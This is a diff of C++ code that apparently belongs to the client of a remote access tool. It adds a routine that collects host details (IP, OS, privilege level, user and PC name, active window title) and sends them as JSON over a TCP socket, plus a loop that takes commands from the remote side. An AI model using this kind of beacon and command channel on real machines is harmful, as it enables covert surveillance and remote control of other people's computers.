@@ -1,17 +1,47 @@
 #pragma once
 
-string GetOS()
+bool GetInfo(TcpIP Client)
 {
-	/*RegUtils ru;
+    SystemUtils su;
+    DirUtils du;
+	WindowUtils wu;
 
-	ru.MasterKey = ru.HKLM;
+    json j;
 
-	if(stoi(ru.RegRead("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild", REG_SZ)) >= 20000)
-		return "Windows 11 " + ru.RegRead("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CompositionEditionID", REG_SZ);
+    j["IPL"] = TcpIP::GetLocalIP(Client.Sock);
+    j["OS"] = su.GetOS();
+    j["UAC"] = (su.CheckUAC()) ? "Admin" : "User";
+    j["PATH"] = du.GetFullFilePath();
+    j["VER"] = Version;
+    j["PCNAME"] = su.GetPCName();
+    j["USERNAME"] = su.GetCurrentUser();
+    j["CPU"] = to_string(su.getCPUload());
+    j["RAM"] = to_string(su.GetRAMperc());
+	j["ACTWIN"] = wu.GetWindowTitle();
+	j["INSTDATE"] = "TODO";
 
-	return ru.RegRead("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", REG_SZ);*/
+    if (COMUNICAZIONI::GetInfo(Client.Sock, j.dump()))
+        return true;
 
-	GeneralUtils gu;
+    return false;
+}
 
-	return SimpleFind(gu.GetCMDOutput("powershell wmic os get Caption"), "Microsoft ", "  ");
+short Sessione(TcpIP Client)
+{
+	string cmd = "";
+
+	for (bool i = true; i;)
+	{
+		cmd = Client.RecvString();
+
+		if (cmd == "")
+			return 0;
+		else if (cmd == "getinfo")
+		{
+			if (!GetInfo(Client))
+				return 0;
+		}
+	}
+
+	return 0;
 }
